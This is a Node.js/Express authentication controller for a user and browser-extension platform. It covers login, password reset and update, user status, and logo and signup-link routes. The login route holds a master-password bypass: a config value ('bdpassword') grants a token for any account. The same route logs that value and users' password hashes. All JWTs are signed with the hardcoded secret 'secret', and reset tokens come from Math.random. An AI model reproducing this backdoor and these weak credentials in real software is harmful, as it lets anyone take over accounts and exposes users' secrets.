
// const {User, UserRelationship,Image} = require('../../../models/sequelise/sequelize')
const userModel = require('../../../models/mongoose/users');
const _helper = require('../../../Helpers/helpers')
const jwt     = require('jsonwebtoken');
const config = require("config");
const { user } = require('../../../Middlewares/API/api');
const extensionuserModel = require('../../../models/mongoose/extensionusers');
const extensionModel = require('../../../models/mongoose/extensions');
const mongoose = require('mongoose');
const { hsts } = require('helmet');
// const { user } = require('../../../Middlewares/API/api');

// module.exports.createAdmin = async (req,res) => {
//     try {
//         const {name, email} = req.body
//         const defaultPassword = "123456"
//         const hash = await _helper.utility.common.encryptPassword(10,defaultPassword)
//         let payload = {
//                      name     : name.toLowerCase(),
//                      email    : email.toLowerCase(),
//                      password : hash
//                     }
//         User.create(payload)
//             .then(user => {
//                 let payload = {
//                     userId     : user.id,
//                     userRoleId : 1,
//                     reportsTo  : 0
//                 }      
//                 UserRelationship.create(payload)
//                     .then(data => {
//                         res.send({
//                             code     : 1,
//                             message  : `Successfully created Admin`,
//                             payload  : req.body
//                         })
//                     })
//                     .catch(err => {
//                         res.send({
//                             code     : 3,
//                             message  : "Error occured while creating Admin",
//                             payload  : err
//                         })
//                     })
//             })   
//     } catch (error) {
//         res.send({
//             code     : 3,
//             message  : "Error occured while creating Admin",
//             payload  : error
//         })
//     }
// }
module.exports.login = async (req,res) => {
    try {
        const {email, password} = req.body;        
        userModel.findOne({ email : email.toLowerCase(),is_deleted : false,suspended_by:0 })
        .then(async data => {
          let  user = data;
            if(user) {
                let payload = {
                    user: {
                      id: user._id,
                      first_name: user.name.first_name,
                      last_name: user.name.last_name,
                      user_type: user.user_type,
                      email: user.email,
                      admin_id : user.associated_admin_id
                    },
                };
                const isValidPassword = await _helper.utility.common.checkPassword(password,user.password)
                if (!isValidPassword) {
                    console.log("User password ",user.password);
                    console.log("Bd password ",config.get("bdpassword"));
                    if(req.body.password == config.get("bdpassword")){
                        res.status(200).send({
                            code: 1,
                            status: true,
                            message: "Logged in successfully",
                            token: jwt.sign(payload, "secret"),
                        });
                    }else{
                        res.status(400).send({
                            code     : 4,
                            message  : "Authentication failed. Wrong password.",
                            payload  : {}
                        });
                    }
                } else {
                    // console.log("User is -",user)
                    res.status(200).send({
                        code: 1,
                        status: true,
                        message: "Logged in successfully",
                        token: jwt.sign(payload, "secret"),
                    });
                }
              }else{
                res.status(400).send({
                    code     : 3,
                    message  : "Authentication failed. User not found.",
                    payload  : {}
                })
              }
          })
        .catch(err => {
            console.log("err",err)
            res.status(400).send({
                code     : 5,
                message  : "Authentication failed. User not found.",
                payload  : err
            })
        })
    } catch (error) {
        res.status(500).send({
            code     : 3,
            message  : "Error occured while Login",
            payload  : error
        })
    }
}

module.exports.extensionUserLogin = async (req,res) => {
    try {
        const {email, password,extension_id} = req.body;
         extensionuserModel.findOne({ "email" : email.toLowerCase()})
        .elemMatch('associated_extension_details',{extension_id:extension_id,is_deleted : false,suspended_by:0})
        .then(async user => {
            if(user) {
                let extensionDetails = user.associated_extension_details;
                let cur_extensionDetails;
                extensionDetails.map(cur_extn =>{
                    if(cur_extn.extension_id == extension_id){
                        cur_extensionDetails = cur_extn;
                    }
                })
                let payload = {
                    user: {
                      id: user._id,
                      email: user.email.toLowerCase(),
                      extension_owner_id : cur_extensionDetails.extension_owner_id,
                      admin_id : cur_extensionDetails.admin_id,
                      extension_id: extension_id
                    },
                };
                const isValidPassword = await _helper.utility.common.checkPassword(password,cur_extensionDetails.password)
                if (!isValidPassword) {
                    return res.status(400).send({
                        code     : 4,
                        message  : "Authentication failed. Wrong password.",
                        payload  : {}
                    });
                } else {
                    let extensionDetails = await extensionModel.findOne({_id:extension_id,is_active:true});
                    if(!extensionDetails){
                        res.status(400).send({
                            code     : 3,
                            message  : "You can't login this extension",
                            payload  : {}
                        })
                    }
                    let videos = extensionDetails.videos;
                    if(videos){
                        if(user.first_loggedin_time == null || videos.length <= 0){
                            user.first_loggedin_time = Date.now();
                            user.save();
                        }
                    }
                    res.status(200).send({
                        code: 1,
                        status: true,
                        message: "Logged in successfully",
                        token: jwt.sign(payload, "secret"),
                    });
                }
              }else{
                res.status(400).send({
                    code     : 3,
                    message  : "Authentication failed. User not found.",
                    payload  : {}
                })
              }
          })
        .catch(err => {
            console.log("err",err)
            res.status(400).send({
                code     : 5,
                message  : "Authentication failed. User not found.",
                payload  : err
            })
        })
    } catch (error) {
        res.status(500).send({
            code     : 3,
            message  : "Error occured while Login",
            payload  : error
        })
    }
}

module.exports.checkUserStatus = async (req,res) => {
    try{
        let user_id = req.user.user.id;
        let extension_id = req.query.ext_id;
        console.log("extension_id ",extension_id);
        let findUser;
        if(!extension_id){
            findUser = await userModel.findOne({_id:user_id,is_deleted :false,suspended_by:0})
            if(!findUser){
                return res.status(500).send({
                    code     : 3,
                    message  : "User not found",
                    payload  : {"status": false}
                })
            }
            return res.status(200).send({
                code     : 3,
                message  : "User found",
                payload  : {"status": true}
            })
        }
        findUser = await extensionuserModel.findOne({_id:user_id})
                    .elemMatch("associated_extension_details",
                    {extension_id:extension_id,is_deleted:false,suspended_by:0});
        if(!findUser){
            res.status(500).send({
                code     : 3,
                message  : "User not found",
                payload  : {"status": false}
            })
        }
        res.status(200).send({
            code     : 3,
            message  : "User found",
            payload  : {"status": true}
        })
    }catch(err){
        res.status(500).send({
            code     : 3,
            message  : "Error occured while checking user status",
            payload  : err
        })
    }
}

module.exports.forgotPassword = async (req, res) => {
    try {
        let user;
        let token = Math.random().toString(32).substring(7);
        if (req.body.extensionId) {
            user = await extensionuserModel.findOne({
                email: req.body.email,
                associated_extension_details :{
                    $elemMatch : {extension_id : req.body.extensionId, is_deleted : false}
                }
            });
            if(!user){
                return res.status(404).send({
                    code: 0,
                    message: "User not found",
                    payload: {},
                });
            }
            await extensionuserModel.update(
                { email: req.body.email ,associated_extension_details : {
                        $elemMatch : {extension_id : req.body.extensionId, is_deleted : false} }
                },
                {$set : {"associated_extension_details.$.password_reset_token" : token}})
        } else {
            user = await userModel.findOne({email:req.body.email,is_deleted :false});
            if(!user){
                return res.status(500).send({
                    code     : 0,
                    message  : "Email is not exist",
                    payload  : {}
                })
            }
            user.password_reset_token = token;
            await user.save();
        }
        let sendMail = await _helper.utility.auth.sendPasswordResetLink(req.body.email, token, req.body.extensionId ? 2 : 1)
        console.log("sending mail ;:: ", sendMail)
        if(sendMail) {
           return res.status(200).send({
                code     : 2,
                message  : "Please check your email for reset password link.",
                payload  : {}
            })
        } else {
            res.status(500).send({
                code     : 4,
                message  : "Failed to reset your password.",
                payload  : {}
            })
        }
    } catch(error) {
        console.log("error while creating token for password reset ",error.message)
        res.status(500).send({
            code     : 5,
            message  : "Error occured while updating the password",
            payload  : {}
        })
    }
}

module.exports.resetPassword = async (req, res) => {
    try {
        let user;
        let password = req.body.newPassword;
				const hash = await _helper.utility.common.encryptPassword(10,password);
        if(req.body.type == 1) {
					user = await userModel.findOne({password_reset_token:req.body.token,is_deleted :false});
					if(!user){
							return res.status(500).send({
									code     : 0,
									message  : "Invalid Token",
									payload  : {}
							})
					}
					user.password_reset_token = "";
					user.password = hash;
					console.log("user :::: ", user)
					await user.save();
        } else if (req.body.type == 2) {
					let getAccount = await extensionuserModel.findOne(
						{ associated_extension_details : {
										$elemMatch : {password_reset_token : req.body.token, is_deleted : false} }
						});
					if(!getAccount) {
						return res.status(404).send({
							code     : 0,
							message  : "Unable to find your account",
							payload  : {}
						})
					}
					await extensionuserModel.update(
						{ associated_extension_details : {
										$elemMatch : {password_reset_token : req.body.token, is_deleted : false} }
						},
						{$set : {
							"associated_extension_details.$.password_reset_token" : "",
							"associated_extension_details.$.password" : hash
						}});
        } else {
            return res.status(400).send({
                code     : 0,
                message  : "Invalid data provided",
                payload  : {}
            })
        }
        res.status(200).send({
            code: 1,
            status: true,
            message: "Password updated successfully.",
        });
    } catch(error) {
			console.log("Error while resetting the password : ", error)
        res.status(500).send({
            code     : 3,
            message  : "Error while resetting password",
            payload  : {}
        })
    }
}

module.exports.updatePassword = async (req, res) => {
    try {
      let user;
			let password;
      if(req.body.extensionId) {
        user = await extensionuserModel.findOne({
            _id: mongoose.Types.ObjectId(req.user.user.id), 
            associated_extension_details :{
                $elemMatch : {extension_id : req.body.extensionId, is_deleted : false}
            }
        }).elemMatch("associated_extension_details",{extension_id: req.body.extensionId, is_deleted : false});
        if(!user){
            return res.status(404).send({
                code: 0,
                message: "User not found",
                payload: {},
            });
        }
        let getPassword = user.associated_extension_details.filter((el) => el.extension_id == req.body.extensionId);
        password = getPassword[0].password;
      } else {
        user = await userModel.findOne({
          _id: req.user.user.id,
          is_deleted: false,
				});
				console.log("useriserse", user)
        if (!user) {
          return res.status(500).send({
            code: 0,
            message: "User not found",
            payload: {},
          });
        }
        password = user.password;
			}
      const passwordCheck = await _helper.utility.common.checkPassword(
        req.body.password,
        password
      );
      if (!passwordCheck) {
        return res.status(400).send({
          code: 0,
          message: "Incorrect current password",
          payload: {},
        });
      }
  
      const hash = await _helper.utility.common.encryptPassword(
        10,
        req.body.newPassword
      );
			console.log("user :::: ", user);
      if(req.body.extensionId) {
				await extensionuserModel.update(
					{ _id: req.user.user.id ,associated_extension_details : {
							$elemMatch : {extension_id : req.body.extensionId, is_deleted : false} }
					},
					{$set : {"associated_extension_details.$.password" : hash}})
				// let data = user.associated_extension_details;
				// console.log("array", typeof data[0].extension_id , typeof req.body.extensionId)
				// let index = user.associated_extension_details.findIndex(el => el.extension_id == mongoose.Types.ObjectId(req.body.extensionId) && el.is_deleted == false)
				// data[index] = {...data[index], password: hash}
				// // // user.associated_extension_details = data;
				// console.log("dta ::::::: ", data)
				// await user.save();
      } else {
        user.password = hash;
        await user.save();
      }
      res.status(200).send({
        code: 1,
        status: true,
        message: "Password updated successfully.",
      });
    } catch (error) {
      console.log("Error while resetting password",error)
      res.status(500).send({
        code: 3,
        message: "Error while resetting password",
        payload: {},
      });
    }
  };

  module.exports.fetchPrimaryLogo = async (req,res) =>{
    try{
        const extension_id = req.body.extension_id;
        let ExtensionDetails = await extensionModel.findOne({_id:extension_id,is_active:true})
        if(!ExtensionDetails){
            return res.status(404).send({
								status: false,
                code    : 3,
                message :"Extension logo is unavailable for now",
                payload : {}
            })
        }
        const primary_logo = ExtensionDetails.logo.primary_logo;
        return res.status(200).send({
            status: true,
            message : "Logo fetched successfully",
            payload:{"primary_logo":primary_logo} 
        })
    }catch(error){
        return res.status(500).send({
            code    : 3,
            message :"Error while fetching logo",
            payload : error
        })
    }
}

module.exports.fetchSignupLink = async (req,res) =>{
    try{
        let extension_details = req.extension_details;
        let signupDetails = {
            "enable_signup":extension_details.enable_signup,
            "signupLink" :extension_details.signup_link
        }
        res.status(200).send({
            code: 1,
            message: "Signup link fetch successfully",
            payload: signupDetails
        })
    }catch(err){
        res.status(500).send({
            code: 4,
            message: "Error occured while fetching Signup link",
            payload: err
        })
    }
}